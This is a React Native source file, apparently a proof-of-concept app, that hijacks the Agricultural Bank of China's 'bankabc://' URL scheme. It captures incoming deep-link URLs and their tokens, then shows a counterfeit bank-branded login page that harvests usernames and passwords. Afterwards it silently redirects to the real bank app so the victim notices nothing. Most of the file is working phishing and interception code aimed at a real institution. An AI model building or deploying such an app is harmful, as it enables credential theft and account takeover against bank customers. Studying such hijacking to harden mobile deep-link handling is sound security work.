import React, { useState, useEffect } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TextInput,
  TouchableOpacity,
  ScrollView,
  Alert,
  Linking,
} from 'react-native';
import { StatusBar } from 'expo-status-bar';
import * as LinkingExpo from 'expo-linking';

export default function App() {
  const [interceptedURL, setInterceptedURL] = useState(null);
  const [history, setHistory] = useState([]);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showLogin, setShowLogin] = useState(false);
  const [showSummary, setShowSummary] = useState(false);

  // 接收 URL Scheme 回调
  useEffect(() => {
    // App 冷启动时通过 URL 打开
    Linking.getInitialURL().then((url) => {
      if (url) handleURL(url);
    });

    // App 已运行时通过 URL 打开
    const subscription = Linking.addEventListener('url', ({ url }) => {
      if (url) handleURL(url);
    });

    return () => subscription.remove();
  }, []);

  const handleURL = (url) => {
    console.log('[劫持成功] 收到 URL:', url);
    setInterceptedURL(url);
    setHistory((prev) => [
      { id: Date.now(), timestamp: new Date().toLocaleString(), url },
      ...prev,
    ]);
  };

  const parseURL = (url) => {
    if (!url) return [];
    try {
      const parsed = new URL(url);
      const params = [];
      params.push({ key: 'scheme', value: parsed.protocol.replace(':', '') });
      params.push({ key: 'host', value: parsed.host });
      params.push({ key: 'path', value: parsed.pathname });
      parsed.searchParams.forEach((value, key) => {
        params.push({ key, value });
      });
      return params;
    } catch (e) {
      return [{ key: 'raw', value: url }];
    }
  };

  const handleLogin = () => {
    console.log('[钓鱼成功] 账号:', username, '密码:', password);
    setShowSummary(true);
  };

  const redirectToRealApp = () => {
    Linking.openURL('bankabc://').catch(() => {
      Alert.alert('提示', '真农行 App 未安装');
    });
  };

  const triggerTest = () => {
    // 在模拟器中可以直接触发
    const testURL =
      'bankabc://login/auth?appId=30428099&redirect=https://bank.abchina.com/confirm&token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMTM4In0.x3';
    Linking.openURL(testURL);
  };

  // ===== 攻击总结页 =====
  if (showSummary) {
    return (
      <ScrollView style={styles.containerDark}>
        <View style={styles.summaryHeader}>
          <Text style={styles.summaryIcon}>!</Text>
          <Text style={styles.summaryTitle}>攻击完成</Text>
          <Text style={styles.summarySub}>以下数据已被恶意 App 截获</Text>
        </View>

        <View style={styles.stolenCard}>
          <Text style={styles.cardTitleRed}>URL Scheme 参数</Text>
          {parseURL(interceptedURL).map((item, i) => (
            <View key={i} style={styles.stolenRow}>
              <Text style={styles.stolenKey}>{item.key}</Text>
              <Text style={styles.stolenVal} numberOfLines={1}>
                {item.value}
              </Text>
            </View>
          ))}
        </View>

        <View style={styles.stolenCard}>
          <Text style={styles.cardTitleRed}>钓鱼页面凭据</Text>
          <View style={styles.stolenRow}>
            <Text style={styles.stolenKey}>用户名</Text>
            <Text style={styles.stolenVal}>{username || '未输入'}</Text>
          </View>
          <View style={styles.stolenRow}>
            <Text style={styles.stolenKey}>密码</Text>
            <Text style={styles.stolenVal}>{password ? '******' : '未输入'}</Text>
          </View>
        </View>

        <TouchableOpacity style={styles.redirectBtn} onPress={redirectToRealApp}>
          <Text style={styles.redirectBtnText}>
            跳转真农行 App（用户无感知）
          </Text>
        </TouchableOpacity>

        <TouchableOpacity
          style={styles.resetBtn}
          onPress={() => {
            setShowSummary(false);
            setShowLogin(false);
            setInterceptedURL(null);
            setUsername('');
            setPassword('');
          }}
        >
          <Text style={styles.resetBtnText}>重新演示</Text>
        </TouchableOpacity>
      </ScrollView>
    );
  }

  // ===== 伪造登录页 =====
  if (showLogin && interceptedURL) {
    return (
      <View style={styles.containerLogin}>
        <StatusBar style="light" />
        <View style={styles.loginHeader}>
          <View style={styles.loginLogo}>
            <Text style={styles.loginLogoText}>农</Text>
          </View>
          <Text style={styles.loginBankName}>中国农业银行</Text>
          <Text style={styles.loginBankSub}>请登录以确认您的交易</Text>
        </View>

        <View style={styles.loginForm}>
          <Text style={styles.inputLabel}>用户名 / 手机号</Text>
          <TextInput
            style={styles.input}
            placeholder="请输入用户名"
            value={username}
            onChangeText={setUsername}
            autoCapitalize="none"
          />

          <Text style={styles.inputLabel}>登录密码</Text>
          <TextInput
            style={styles.input}
            placeholder="请输入密码"
            value={password}
            onChangeText={setPassword}
            secureTextEntry
          />

          <TouchableOpacity style={styles.loginBtn} onPress={handleLogin}>
            <Text style={styles.loginBtnText}>登 录</Text>
          </TouchableOpacity>

          <Text style={styles.loginHint}>为了您的资金安全，请确认本人操作</Text>
        </View>
      </View>
    );
  }

  // ===== 主页面：劫持记录 =====
  return (
    <ScrollView style={styles.container}>
      <StatusBar style="light" />

      <View style={styles.header}>
        <Text style={styles.headerTitle}>URL Scheme 劫持</Text>
        <Text style={styles.headerSub}>PoC App — bankabc://</Text>
      </View>

      <View style={styles.statusCard}>
        <Text style={styles.statusText}>
          已劫持 {history.length} 次
        </Text>
      </View>

      {interceptedURL ? (
        <View style={styles.urlCard}>
          <Text style={styles.urlLabel}>最新捕获 URL</Text>
          <Text style={styles.urlValue}>{interceptedURL}</Text>

          <Text style={styles.paramHeader}>解析参数：</Text>
          {parseURL(interceptedURL).map((item, i) => (
            <View key={i} style={styles.paramRow}>
              <Text style={styles.paramKey}>{item.key}</Text>
              <Text style={styles.paramVal} numberOfLines={1}>
                {item.value}
              </Text>
            </View>
          ))}

          <TouchableOpacity
            style={styles.phishBtn}
            onPress={() => setShowLogin(true)}
          >
            <Text style={styles.phishBtnText}>弹出伪造登录页</Text>
          </TouchableOpacity>
        </View>
      ) : (
        <View style={styles.emptyState}>
          <Text style={styles.emptyText}>尚未捕获到 bankabc:// 链接</Text>
          <Text style={styles.emptySub}>
            请从 Safari 或短信中打开 bankabc:// 链接
          </Text>
        </View>
      )}

      {history.length > 0 && (
        <View style={styles.historySection}>
          <Text style={styles.historyTitle}>劫持记录</Text>
          {history.map((item) => (
            <View key={item.id} style={styles.historyItem}>
              <Text style={styles.historyTime}>{item.timestamp}</Text>
              <Text style={styles.historyURL} numberOfLines={2}>
                {item.url}
              </Text>
            </View>
          ))}
        </View>
      )}

      <TouchableOpacity style={styles.testBtn} onPress={triggerTest}>
        <Text style={styles.testBtnText}>发送测试链接</Text>
      </TouchableOpacity>

      <View style={styles.footer}>
        <Text style={styles.footerText}>
          Info.plist 已注册 bankabc URL Scheme{'\n'}
          当用户点击 bankabc:// 链接时，iOS 会弹出选择框{'\n'}
          选中本 App 即可截获完整 URL
        </Text>
      </View>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0f0f1a' },
  containerDark: { flex: 1, backgroundColor: '#1a1a2e' },
  containerLogin: { flex: 1, backgroundColor: '#f5f5f5' },
  header: {
    paddingTop: 60,
    paddingBottom: 20,
    alignItems: 'center',
    backgroundColor: '#0f0f1a',
  },
  headerTitle: { fontSize: 22, fontWeight: '700', color: '#fff' },
  headerSub: { fontSize: 13, color: '#8E8E93', marginTop: 4 },
  statusCard: {
    alignItems: 'center',
    paddingVertical: 16,
    marginHorizontal: 20,
    backgroundColor: 'rgba(0,153,102,0.15)',
    borderRadius: 12,
    marginBottom: 16,
  },
  statusText: { fontSize: 18, fontWeight: '600', color: '#00cc88' },
  urlCard: {
    marginHorizontal: 20,
    backgroundColor: 'rgba(255,255,255,0.06)',
    borderRadius: 12,
    padding: 16,
    marginBottom: 16,
    borderWidth: 1,
    borderColor: 'rgba(255,255,255,0.1)',
  },
  urlLabel: {
    fontSize: 11,
    color: '#8E8E93',
    textTransform: 'uppercase',
    marginBottom: 6,
  },
  urlValue: {
    fontFamily: 'monospace',
    fontSize: 12,
    color: '#FFD60A',
    lineHeight: 20,
  },
  paramHeader: {
    fontSize: 13,
    color: '#fff',
    marginTop: 16,
    marginBottom: 8,
    fontWeight: '600',
  },
  paramRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    paddingVertical: 8,
    borderBottomWidth: 1,
    borderBottomColor: 'rgba(255,255,255,0.06)',
  },
  paramKey: { fontSize: 13, color: '#8E8E93' },
  paramVal: { fontSize: 13, color: '#FFD60A', fontFamily: 'monospace', maxWidth: 200 },
  emptyState: {
    alignItems: 'center',
    paddingVertical: 60,
  },
  emptyText: { fontSize: 16, color: '#8E8E93' },
  emptySub: { fontSize: 13, color: '#555', marginTop: 8 },
  phishBtn: {
    backgroundColor: '#FF3B30',
    paddingVertical: 14,
    borderRadius: 10,
    alignItems: 'center',
    marginTop: 16,
  },
  phishBtnText: { color: '#fff', fontSize: 15, fontWeight: '600' },
  historySection: { marginHorizontal: 20, marginBottom: 16 },
  historyTitle: {
    fontSize: 14,
    color: '#8E8E93',
    marginBottom: 10,
    fontWeight: '600',
  },
  historyItem: {
    backgroundColor: 'rgba(255,255,255,0.04)',
    borderRadius: 8,
    padding: 12,
    marginBottom: 8,
  },
  historyTime: { fontSize: 11, color: '#8E8E93', marginBottom: 4 },
  historyURL: { fontSize: 12, color: '#FFD60A', fontFamily: 'monospace' },
  testBtn: {
    marginHorizontal: 20,
    backgroundColor: 'rgba(0,153,102,0.2)',
    borderWidth: 1,
    borderColor: '#009966',
    paddingVertical: 12,
    borderRadius: 10,
    alignItems: 'center',
    marginBottom: 20,
  },
  testBtnText: { color: '#00cc88', fontSize: 14 },
  footer: { padding: 20, alignItems: 'center' },
  footerText: { fontSize: 12, color: '#555', textAlign: 'center', lineHeight: 20 },

  // Login styles
  loginHeader: {
    paddingTop: 80,
    paddingBottom: 30,
    alignItems: 'center',
    backgroundColor: '#009966',
  },
  loginLogo: {
    width: 72,
    height: 72,
    backgroundColor: '#fff',
    borderRadius: 16,
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 12,
  },
  loginLogoText: { fontSize: 32, fontWeight: '700', color: '#009966' },
  loginBankName: { fontSize: 20, fontWeight: '700', color: '#fff' },
  loginBankSub: { fontSize: 12, color: 'rgba(255,255,255,0.8)', marginTop: 4 },
  loginForm: {
    marginHorizontal: 24,
    backgroundColor: '#fff',
    borderRadius: 16,
    padding: 24,
    marginTop: 20,
  },
  inputLabel: { fontSize: 12, color: '#8E8E93', marginBottom: 6 },
  input: {
    borderWidth: 1.5,
    borderColor: '#e0e0e0',
    borderRadius: 10,
    padding: 12,
    fontSize: 15,
    marginBottom: 16,
  },
  loginBtn: {
    backgroundColor: '#009966',
    paddingVertical: 14,
    borderRadius: 10,
    alignItems: 'center',
    marginTop: 8,
  },
  loginBtnText: { color: '#fff', fontSize: 16, fontWeight: '600' },
  loginHint: {
    fontSize: 11,
    color: '#8E8E93',
    textAlign: 'center',
    marginTop: 16,
  },

  // Summary styles
  summaryHeader: {
    paddingTop: 80,
    paddingBottom: 24,
    alignItems: 'center',
  },
  summaryIcon: {
    width: 72,
    height: 72,
    backgroundColor: '#FF3B30',
    borderRadius: 36,
    color: '#fff',
    fontSize: 36,
    fontWeight: '700',
    textAlign: 'center',
    lineHeight: 72,
    marginBottom: 16,
  },
  summaryTitle: { fontSize: 20, fontWeight: '700', color: '#fff' },
  summarySub: { fontSize: 13, color: '#8E8E93', marginTop: 6 },
  stolenCard: {
    marginHorizontal: 20,
    backgroundColor: 'rgba(255,255,255,0.06)',
    borderRadius: 12,
    padding: 16,
    marginBottom: 12,
    borderWidth: 1,
    borderColor: 'rgba(255,255,255,0.1)',
  },
  cardTitleRed: {
    fontSize: 12,
    color: '#FF6B6B',
    textTransform: 'uppercase',
    fontWeight: '600',
    marginBottom: 10,
  },
  stolenRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    paddingVertical: 6,
    borderBottomWidth: 1,
    borderBottomColor: 'rgba(255,255,255,0.06)',
  },
  stolenKey: { fontSize: 13, color: '#8E8E93' },
  stolenVal: { fontSize: 13, color: '#FFD60A', fontFamily: 'monospace', maxWidth: 200 },
  redirectBtn: {
    marginHorizontal: 20,
    backgroundColor: 'rgba(0,153,102,0.2)',
    borderWidth: 1,
    borderColor: '#009966',
    paddingVertical: 12,
    borderRadius: 10,
    alignItems: 'center',
    marginTop: 16,
  },
  redirectBtnText: { color: '#00cc88', fontSize: 13 },
  resetBtn: {
    marginHorizontal: 20,
    backgroundColor: '#009966',
    paddingVertical: 14,
    borderRadius: 10,
    alignItems: 'center',
    marginTop: 12,
    marginBottom: 40,
  },
  resetBtnText: { color: '#fff', fontSize: 15, fontWeight: '600' },
});
